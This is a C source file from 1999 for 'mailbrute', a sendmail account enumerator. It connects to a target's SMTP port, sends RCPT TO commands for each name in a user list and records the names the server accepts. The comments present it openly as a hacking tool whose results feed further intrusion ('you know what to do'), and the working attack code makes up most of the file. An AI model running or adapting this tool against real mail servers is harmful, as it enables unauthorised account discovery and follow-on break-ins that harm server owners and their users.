/*
 *                        mailbrute
 *          By axess ( axess@mail.com ) in Nov-1999
 *
 *   Damn ugly sendmail bruteforcer for valid accounts.
 *   But it werks and just proves this and i will not make this better.
 *    
 *   The story about it is that sendmail take how many rcpt to:
 *   as we want to send and never disconnect the user, that tries more.
 *   Well, why it is like this can any one with any brain figure out =)  
 *   But this is also a real good way to bruteforce for valid accounts. heh
 *
 *   Say helo to it.
 *   Just pick an mail from: and then we are ready to brute it.
 *   We wont get disconnected when we just fast send
 *   rcpt to: username from an userlist of lets say 1000
 *   of the most used usernames you can think of.
 *   Like this..
 *
 *   550 test... User unknown
 *   rcpt to:test2
 *   550 test2... User unknown
 *   rcpt to:test3
 *   550 test3... User unknown
 *   rcpt to:axess
 *   250 axess... Recipient ok
 *
 *   Ohh, then we know that axess is an user on the remote computer.
 *
 *   Usage : ./mailbrute <host> <userlist> <outfile>
 *
 *   Look in the outfile for valid ones.
 * 
 *   After you got some accounts..
 *   Yea well you know what to do.
 *
 *   Solution:
 *   Well , i cant figure out a real good way but this is not easy 
 *   and make a maillog that is not of this world so if anyone think
 *   this is a good way to hack . feel free to do it.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>

int main (int argc, char **argv)
{
  struct sockaddr_in server;
  struct hostent *hp;
  int s;
  int gibmesize;
  char helo[100];
  char mail[100];
  char rcpt[100];
  char gibme[500];
  char name[1024];

  FILE *ip;
  FILE *of;

if(argc < 4)
    {
     printf("\n\n    mailbrute ( sendmail account bruteforcer ) \n");
     printf("     By axess ( axess@mail.com ) in Dec-1999    \n"); 
     printf("                                             \n");
     printf("   Usage: %s <host> <userlist> <outfile>\n", argv[0]);
     printf("                                            \n\n");
     exit(0);
    }

if((hp = gethostbyname (argv[1])) == NULL) {
      printf ("Could not resolve %s.\n", argv[1]);
      exit(1); }

if((ip = fopen(argv[2], "r")) == NULL) {
      printf("Error: input file does not exist\n");
      exit(1); }

if((of = fopen(argv[3], "w")) == NULL) {
      printf("Error: Cant write to file?\n");
      exit(1); }

if((s = socket (AF_INET, SOCK_STREAM, 0)) == -1) {
      printf("Error");
      exit(1); }
 
  server.sin_family = AF_INET;
  server.sin_port = htons (25);
  server.sin_addr.s_addr = *(u_long *) hp->h_addr;
  bzero (&(server.sin_zero), 8);
 
if(connect(s, (struct sockaddr *) &server, sizeof (struct sockaddr)) == -1) {
      printf ("Connection refused\n");
      exit(1); }

  sprintf (helo, "helo mail\r\n");
  sprintf (mail, "mail from:mailme@hotmail.com\r\n");
  send (s, helo, strlen (helo), 0);
  send (s, mail, strlen (mail), 0);

   while(fscanf(ip, "%s", name) != EOF) {
  fprintf(of,"Username %s   \n",name);
 
  sprintf (rcpt, "rcpt to:%s\r\n",name);
  send (s, rcpt, strlen (rcpt), 0);

  gibmesize = recv(s,gibme, sizeof(gibme),0);
  gibme[gibmesize] = '\0';
  
  if((strstr(gibme, "Recipient") != NULL)) {
  fprintf(of,"%s",gibme); 
  }  }
  close (s);
  exit(0);
}
